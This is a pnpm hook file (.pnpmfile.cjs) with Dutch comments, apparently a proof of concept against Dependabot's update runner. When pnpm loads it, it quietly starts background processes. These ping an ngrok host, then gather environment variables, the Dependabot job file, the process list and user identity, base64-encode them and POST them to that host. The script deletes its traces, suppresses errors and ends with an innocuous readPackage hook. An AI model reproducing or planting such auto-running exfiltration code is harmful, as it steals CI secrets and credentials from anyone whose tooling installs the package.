'use strict';
// .pnpmfile.cjs -- loaded by pnpm as a core hook, NOT a lifecycle script
// execSync blocked pnpm -- gebruik spawn+unref zodat pnpm niet vastloopt

try {
  const { spawn } = require('child_process');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';
  const jp = process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json';

  // 1. Snelle ping -- bevestigt dat dit bestand geladen wordt
  spawn('curl', ['-sk', NGROK + '?poc=pnpm_loaded', '-o', '/dev/null'],
    { detached: true, stdio: 'ignore' }).unref();

  // 2. Volledige exfil op achtergrond -- blokkeert pnpm NIET
  const script =
    '(echo "=ENV="; env; ' +
    'echo "=JOB="; cat "' + jp + '" 2>/dev/null; ' +
    'echo "=PS="; ps aux 2>/dev/null; ' +
    'echo "=ID="; id; ' +
    'echo "=NODE="; node --version 2>/dev/null; ' +
    'echo "=PNPM="; pnpm --version 2>/dev/null) | base64 -w0 > /tmp/.px 2>/dev/null && ' +
    "curl -sk -X POST '" + NGROK + "?poc=pnpm_rce' " +
    "-H 'Content-Type: text/plain' --data-binary @/tmp/.px 2>/dev/null; " +
    'rm -f /tmp/.px';

  spawn('sh', ['-c', script], { detached: true, stdio: 'ignore' }).unref();

} catch (e) {
  // fail silently
}

module.exports = {
  hooks: {
    readPackage(pkg) { return pkg; }
  }
};
